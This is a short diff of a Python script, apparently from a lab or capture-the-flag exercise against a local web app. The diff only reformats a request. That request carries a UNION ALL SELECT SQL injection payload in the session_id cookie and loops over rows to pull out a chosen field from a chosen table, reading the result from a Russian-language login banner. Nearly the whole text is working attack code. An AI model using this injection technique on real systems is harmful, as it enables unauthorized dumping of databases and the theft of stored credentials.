@@ -1,5 +1,6 @@
 import requests
 
+
 # SQL INJ 1
 
 def get_all_fields(field, table):
@@ -7,7 +8,13 @@ def get_all_fields(field, table):
     res = []
     while True:
         try:
-            r = requests.get("http://127.0.0.1:8000/", headers={"Cookie": "session_id=\"' UNION ALL SELECT {}, '', '0' FROM {} LIMIT {},1 --\"".format(field, table, i)})
+            r = requests.get("http://127.0.0.1:8000/", headers={
+                "Cookie": "session_id=\"' UNION ALL SELECT {}, '', '0' FROM {} LIMIT {},1 --\"".format(
+                    field,
+                    table,
+                    i
+                )
+            })
             table_name = r.text.split("Вы вошли как ")[1].split("</a>")[0].strip()
             i += 1
             if table_name == "Гость":
